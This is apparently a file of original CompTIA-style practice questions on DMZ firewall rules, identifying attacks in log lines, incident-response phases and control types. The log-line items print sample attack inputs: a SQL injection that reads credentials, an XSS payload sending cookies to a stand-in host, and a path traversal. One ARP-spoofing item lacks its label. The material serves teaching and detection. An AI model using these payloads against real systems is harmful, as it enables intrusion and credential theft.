note: Original performance-based questions written for Patch Notes, in the style of CompTIA's. They are not real exam questions.

pbqs.title: Write the DMZ firewall rules
pbqs.scenario: The web server 10.0.0.5 sits in a DMZ. Write the rules for traffic to it.
requirements: Anyone on the internet can reach the website over HTTPS.
Admins on 10.0.5.0/24 can use SSH to the server.
Nothing else reaches it, including plain HTTP and remote desktop.
Policy: end with an explicit rule that denies everything else.

tests.label: A customer: 203.0.113.9 to 10.0.0.5, TCP 443
tests.why: HTTPS from anywhere is the whole point of the server.

tests.label: Another customer: 198.51.100.20 to 10.0.0.5, TCP 443
tests.why: Customers come from anywhere, so the source must be any, not one range.

tests.label: An admin: 10.0.5.20 to 10.0.0.5, TCP 22
tests.why: SSH from the admin range only.

tests.label: An admin browsing the site: 10.0.5.20 to 10.0.0.5, TCP 443
tests.why: Admins are customers too: the HTTPS rule covers them.

tests.label: SSH from the internet: 203.0.113.9 to 10.0.0.5, TCP 22
tests.why: SSH open to the internet invites password guessing. Only the admin range may use it.

tests.label: Remote desktop from the internet: 203.0.113.50 to 10.0.0.5, TCP 3389
tests.why: Exposed RDP is a classic way in for ransomware.

tests.label: Remote desktop from an admin: 10.0.5.20 to 10.0.0.5, TCP 3389
tests.why: Admins were given SSH, nothing more: least privilege.

pbqs.simplification: Each packet is judged on its own against the list (a stateless ACL). Real firewalls also track connections, so replies are let back in automatically.

pbqs.title: Name the attack in each log line
pbqs.scenario: The SOC has pulled one line from each of eight alerts. Name the attack each one shows.
pbqs.prompt: Choose the attack each line shows.

items.text: GET /products?id=7' UNION SELECT username,password FROM users-- HTTP/1.1 200
items.why: The quote ends the app's query and UNION SELECT adds the attacker's own, reading the users table.

items.text: GET /search?q=<script>new Image().src='https://203.0.113.9/c?'+document.cookie</script> 200
items.why: A script in the input that sends the visitor's cookie away: reflected XSS.

items.text: GET /download?file=../../../../etc/passwd HTTP/1.1 200
items.why: Each ../ climbs a folder, reaching files outside the web root.

items.text: sshd: Failed password for root from 203.0.113.45 port 51001 ssh2 (412 in 5 minutes)
items.why: One account, one source, hundreds of guesses.

items.text: Sign-in failed (AADSTS50126) for 37 users from 198.51.100.23, one attempt each, same minute
items.why: One common password tried once against many accounts, staying under lockout limits.

items.text: GET /api/orders/10442 user=3381 owner=2205 200 OK
items.why: User 3381 read order 10442, which belongs to 2205: the server didn't check ownership.

items.text: Inbound UDP 123 (NTP) responses to 203.0.113.80: 1,900 sources, 400 MB/s, no requests sent
items.why: Replies nobody asked for, from many open NTP servers: the attacker spoofed the victim's address.
The gateway's address suddenly maps to a different MAC: someone is putting themselves in the middle.

pbqs.simplification: Each line is shortened from the real log format to the part that matters.

pbqs.title: Put each action in its incident response phase
pbqs.scenario: An infostealer was found on a laptop at a small firm. Here's what the team did. Which phase does each action belong to?
pbqs.prompt: Choose the incident response phase for each action.

items.text: Wrote the incident response plan and ran a tabletop exercise in the spring
items.why: Done before anything happens: plans, contacts, tools and practice.

items.text: The EDR alerted on encoded PowerShell started by a .pdf.js file
items.why: Noticing that something may be wrong.

items.text: Worked out which saved logins were stolen and where they were used
items.why: Scoping: what happened, how far it got, and how.

items.text: Isolated the laptop from the network but left it powered on
items.why: Stop the spread while keeping evidence (memory is lost if it's switched off).

items.text: Removed the malware and its scheduled task, and reset every stolen password
items.why: Remove the attacker's foothold and what they took.

items.text: Reimaged the laptop, returned it, and watched it closely for a week
items.why: Back to normal, with extra monitoring.

items.text: Met a week later, agreed to block .js attachments, and updated the plan
items.why: Improve so it doesn't happen again.

pbqs.title: Name the control type
pbqs.scenario: An auditor lists controls at a fictional clinic. Classify each by what it does.
pbqs.prompt: Choose the control type for each one.

items.text: MFA required for every remote login
items.why: It stops an attacker with only a password from getting in.

items.text: A SIEM alert when one account fails to log in 50 times in a minute
items.why: It spots something happening; it doesn't stop it by itself.

items.text: Restoring a deleted patient folder from last night's backup
items.why: It puts things right after an incident.

items.text: A sign on the server room door: "CCTV in operation, intruders will be prosecuted"
items.why: It discourages an attempt; it doesn't physically stop one.

items.text: An old X-ray PC that can't be patched is put on its own VLAN with strict firewall rules
items.why: Patching isn't possible, so another control reduces the same risk instead.

items.text: An acceptable use policy every member of staff signs
items.why: It tells people what they must and mustn't do.

items.text: CCTV recordings reviewed after a break-in
items.why: Reviewing footage finds and records what happened.
